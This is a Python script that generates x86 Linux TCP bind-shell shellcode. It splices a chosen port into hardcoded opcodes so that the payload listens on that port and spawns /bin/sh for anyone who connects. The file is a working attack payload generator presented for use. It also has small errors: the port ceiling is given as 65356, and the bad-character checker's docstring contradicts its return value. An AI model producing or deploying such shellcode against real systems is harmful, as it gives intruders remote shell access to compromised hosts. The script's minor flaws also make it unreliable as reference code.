#!/usr/bin/python

'''

; Filename: generate_tcpbind.py
; Author:  Plaix
; Website:  http://slacklabs.be
;
; Purpose: 
    Generates a x86 linux tcp bind shell on a configurable port and runs 
    /bin/sh on connect

'''

import sys
pre_sh="\\x31\\xc9\\xf7\\xe1\\xb0\\x66\\x43\\x51\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x96\\x5b\\x52\\x66\\x68"
post_sh="\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x43\\x43\\x52\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x43\\x52\\x52\\x56\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x59\\x49\\x93\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xe1\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
#Printing hex output with len 99

def check_for_badchars(bclist,shellcode):
    '''
    returns false if badchars are found in resulting shellcode
    '''
    bclist=bytearray(bclist.decode('string_escape'))
    for x in bytearray(bclist):
        result=bytearray(shellcode).find(bytearray(chr(x)))
        if result != -1:
            return True
    # We're golden
    return False

def generate_shellcode(port):
    
    if(port > 65356):
        print ("[+] Port number %s is above limit of 65356, exiting!!" % port)
        return -1
    if(port < 1024 ):
        print ("[+] Port number %s requires root permissions!!" % port)

    port=format(port,"#02x")[2:]
    if len(port) < 4:
        port="0"+str(port)
    port="\\x"+port[:2]+"\\x"+port[2:4]    
    print ("[+] Port converted to hex:\t%s" % port)

    return pre_sh+port+post_sh

if __name__ == '__main__':
    
    if len(sys.argv) < 2:
        print("Need a port as argument")
        print("Usage:\t %s <port|4444>" % sys.argv[0])
    else:
        print("[+] Using port %s" % sys.argv[1])
        result=generate_shellcode(int(sys.argv[1]))
        if(result==-1):
            print("[+] Shellcode generating failed!!")
        else:
            print("[+] Shellcode length:\t%i" % (len(result)/4))
            print("[+] Shellcode :\n%s\n" % result)

